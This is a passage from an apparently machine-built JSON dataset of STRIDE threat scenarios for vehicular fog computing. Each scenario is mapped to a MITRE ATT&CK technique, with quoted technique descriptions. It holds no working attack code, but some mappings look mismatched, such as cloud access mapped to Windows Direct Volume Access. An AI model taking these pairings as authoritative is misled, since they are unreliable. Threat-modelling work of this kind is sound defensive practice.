2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading cloud services with requests from multiple fog nodes, causing service slowdowns or crashes.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service lacks scalability mechanisms",
                    "Role": "Cloud Service Provider",
                    "Condition": "Inability to scale under load"
                },
                {
                    "Assumption": "Fog nodes can send unlimited requests",
                    "Role": "System Designers",
                    "Condition": "No rate limiting on fog nodes"
                },
                {
                    "Assumption": "Absence of load balancing mechanisms",
                    "Role": "Network Admin",
                    "Condition": "No load balancing in place"
                }
            ],
            "Potential Impact": "This severely impacts the availability of cloud services and their ability to support advanced applications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud services",
                "overloading",
                "service availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers may exploit vulnerabilities to take control of RSUs, disrupting data collection and traffic management services.",
            "Assumptions": [
                {
                    "Assumption": "RSUs have software vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Exploitable software flaws"
                },
                {
                    "Assumption": "Weak protection measures for RSUs",
                    "Role": "Network Admin",
                    "Condition": "Inadequate RSU security"
                },
                {
                    "Assumption": "Absence of real-time monitoring for RSUs",
                    "Role": "Security Admin",
                    "Condition": "Lack of RSU monitoring"
                }
            ],
            "Potential Impact": "This results in disrupted traffic flow and failure to process real-time data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "RSUs",
                "data disruption",
                "traffic management"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers exploiting vulnerabilities in the firmware of fog nodes to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes have outdated firmware",
                    "Role": "Network Admin",
                    "Condition": "Firmware not regularly updated"
                },
                {
                    "Assumption": "Firmware lacks built-in security controls",
                    "Role": "System Designers",
                    "Condition": "Poorly secured firmware"
                },
                {
                    "Assumption": "Unmonitored access to firmware updates",
                    "Role": "Security Admin",
                    "Condition": "Lack of update monitoring"
                }
            ],
            "Potential Impact": "This grants attackers control over fog nodes, enabling them to manipulate the system freely.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "firmware",
                "fog nodes",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting weak authentication mechanisms in cloud services to gain unauthorized administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have weak or misconfigured authentication protocols",
                    "Role": "Cloud Service Provider",
                    "Condition": "Misconfigured authentication methods"
                },
                {
                    "Assumption": "No multi-factor authentication enforced",
                    "Role": "System Designers",
                    "Condition": "Lack of MFA implementation"
                },
                {
                    "Assumption": "Access control lists are not properly managed",
                    "Role": "Network Admin",
                    "Condition": "Improper ACL management"
                }
            ],
            "Potential Impact": "This could lead to unauthorized modifications and access to sensitive data stored in the cloud.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "weak authentication",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Fog node operators using default credentials can escalate their privileges within the system.",
            "Assumptions": [
                {
                    "Assumption": "Default credentials have not been changed",
                    "Role": "Fog Node Operator",
                    "Condition": "Using default login credentials"
                },
                {
                    "Assumption": "Access control mechanisms are not stringent",
                    "Role": "System Designers",
                    "Condition": "Weak access control policies"
                },
                {
                    "Assumption": "Intrusion detection systems are not in place",
                    "Role": "Security Admin",
                    "Condition": "Absence of threat detection systems"
                }
            ],
            "Potential Impact": "This could enable unauthorized access and manipulation of critical system components.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "fog nodes",
                "default credentials",
                "access control"
            ],
            "mitre_technique": {
                "name": "Default Credentials",
                "description": "Adversaries may leverage manufacturer or supplier set default credentials on control system devices. These default credentials may have administrative permissions and may be necessary for initial configuration of the device. It is general best practice to change the passwords for these accounts as soon as possible, but some manufacturers may have devices that have passwords or usernames that cannot be changed. (Citation: Keith Stouffer May 2015)\n\nDefault credentials are normally documented in an instruction manual that is either packaged with the device, published online through official means, or published online through unofficial means. Adversaries may leverage default credentials that have not been properly modified or disabled.",
                "id": "attack-pattern--8bb4538f-f16f-49f0-a431-70b5444c7349",
                "technique_id": "T0812"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofed Smart Vehicle",
            "Assumptions": [
                {
                    "Assumption": "The attacker can imitate the identity of a legitimate smart vehicle.",
                    "Role": "Attacker",
                    "Condition": "Vehicle authentication is weak or non-existent."
                },
                {
                    "Assumption": "The fog node does not thoroughly validate vehicle identities.",
                    "Role": "Fog Node",
                    "Condition": "Insufficient security protocols in place at the fog node."
                }
            ],
            "Potential Impact": "Unauthorized access to the VFC system, potential data breach.",
            "MITRE ATT&CK Keywords": [
                "identity spoofing",
                "network",
                "smart vehicle",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofed Fog Node",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to a fog node or can emulate it.",
                    "Role": "Attacker",
                    "Condition": "Weak authentication protocols for fog nodes."
                },
                {
                    "Assumption": "Smart vehicles and cloud services do not validate the authenticity of fog nodes.",
                    "Role": "System",
                    "Condition": "Lack of mutual authentication mechanisms."
                }
            ],
            "Potential Impact": "Data manipulation and interception, potential system disruption.",
            "MITRE ATT&CK Keywords": [
                "fog node",
                "device spoofing",
                "local network",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Spoofed Cloud Server",
            "Assumptions": [
                {
                    "Assumption": "The attacker can spoof the cloud server endpoint.",
                    "Role": "Attacker",
                    "Condition": "DNS poisoning or similar attack method is successful."
                },
                {
                    "Assumption": "Fog nodes and vehicles trust data from cloud servers without rigorous validation.",
                    "Role": "System",
                    "Condition": "Lack of certificate pinning or validation."
                }
            ],
            "Potential Impact": "False data being disseminated, potential widespread impact on traffic and vehicle management.",
            "MITRE ATT&CK Keywords": [
                "cloud server",
                "spoofing",
                "Man-in-the-Middle",
                "DNS poisoning"
            ],
            "mitre_technique": {
                "name": "Compromise Infrastructure",
                "description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Additionally, adversaries may also compromise infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking)\n\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",
                "id": "attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9",
                "technique_id": "T1584"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampering with Data in Transit",
            "Assumptions": [
                {
                    "Assumption": "Data between vehicles and fog nodes is not encrypted.",
                    "Role": "System",
                    "Condition": "Lack of end-to-end encryption."
                },
                {
                    "Assumption": "The attacker has capability to intercept the data stream.",
                    "Role": "Attacker",
                    "Condition": "Access to the network path or node."
                }
            ],
            "Potential Impact": "Corrupted data, leading to incorrect decisions by the fog node or cloud.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "data tampering",
                "network",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampering with Fog Node Firmware",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to a fog node.",
                    "Role": "Attacker",
                    "Condition": "Insufficient physical security at node locations."
                },
                {
                    "Assumption": "Firmware updates are not signed or verified.",
                    "Role": "System",
                    "Condition": "Lack of secure boot or firmware verification mechanisms."
                }
            ],
            "Potential Impact": "Control over fog node behavior, leading to widespread incorrect decisions and potential data alteration.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "physical access",
                "node control"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampering with Cloud Data",
            "Assumptions": [
                {
                    "Assumption": "Attackers have compromised cloud service credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak password practices or successful phishing attack."
                },
                {
                    "Assumption": "Cloud data integrity checks are insufficient.",
                    "Role": "System",
                    "Condition": "Lack of regular data integrity verification."
                }
            ],
            "Potential Impact": "Altered historical data leading to incorrect analytics and predictions.",
            "MITRE ATT&CK Keywords": [
                "cloud",
                "data integrity",
                "tampering",
                "credential compromise"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Fog Node Traffic Management Actions",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not log actions in a secure manner.",
                    "Role": "Fog Nodes",
                    "Condition": "Lack of secure logging and audit trails."
                },
                {
                    "Assumption": "No mechanism to verify the authenticity of logs.",
                    "Role": "System",
                    "Condition": "Logs can be altered without detection."
                }
            ],
            "Potential Impact": "Unable to determine the origin of traffic management actions, leading to untraceable disruptions.",
            "MITRE ATT&CK Keywords": [
                "fog node",
                "logging",
                "traffic management",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud Service Data Alteration",
            "Assumptions": [
                {
                    "Assumption": "Cloud service actions are not thoroughly logged.",
                    "Role": "Cloud Services",
                    "Condition": "Insufficient logging and monitoring."
                },
                {
                    "Assumption": "Logs can be modified or deleted by an attacker.",
                    "Role": "Attacker",
                    "Condition": "Access to logging facilities without strict controls."
                }
            ],
            "Potential Impact": "Lack of accountability for data alterations, impacting forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "cloud service",
                "data alteration",
                "logging",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Vehicle Data Transmission",
            "Assumptions": [
                {
                    "Assumption": "Vehicle transmissions are not logged securely.",
                    "Role": "Smart Vehicles",
                    "Condition": "Weak logging mechanisms within the vehicle."
                },
                {
                    "Assumption": "Logs cannot be verified for integrity.",
                    "Role": "System",
                    "Condition": "Absence of integrity checks for logs."
                }
            ],
            "Potential Impact": "Disputes and undetectable false claims regarding vehicle conditions or actions.",
            "MITRE ATT&CK Keywords": [
                "vehicle",
                "logging",
                "data transmission",
                "dispute resolution"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unencrypted Data Transmission",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption between vehicles and fog nodes.",
                    "Role": "System",
                    "Condition": "Lack of encryption for data in transit."
                },
                {
                    "Assumption": "The attacker has access to the transmission medium.",
                    "Role": "Attacker",
                    "Condition": "Possible network access by the attacker."
                }
            ],
            "Potential Impact": "Disclosure of sensitive vehicle and traffic data to unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "data transmission",
                "encryption",
                "sensitive information",
                "network security"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized Cloud Service Access",
            "Assumptions": [
                {
                    "Assumption": "Cloud service access controls are insufficient.",
                    "Role": "Cloud Services",
                    "Condition": "Weak access control mechanisms."
                },
                {
                    "Assumption": "Attackers can exploit known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Existence of known CVEs not mitigated."
                }
            ],
            "Potential Impact": "Access to vehicle and traffic data stored in the cloud, leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "cloud service",
                "access control",
                "sensitive data",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised Fog Node",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack encryption for stored data.",
                    "Role": "Fog Nodes",
                    "Condition": "Absence of data-at-rest encryption mechanisms."
                },
                {
                    "Assumption": "Attacker gains access to a fog node.",
                    "Role": "Attacker",
                    "Condition": "Successful physical or remote compromise of a fog node."
                }
            ],
            "Potential Impact": "Disclosure of locally stored sensitive data related to vehicles and infrastructure.",
            "MITRE ATT&CK Keywords": [
                "fog node",
                "data storage",
                "encryption",
                "compromise"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding Fog Nodes",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have adequate protections against traffic flooding.",
                    "Role": "Fog Nodes",
                    "Condition": "Lack of rate limiting or DoS protection mechanisms."
                },
                {
                    "Assumption": "The attacker can generate a large volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to significant network resources."
                }
            ],
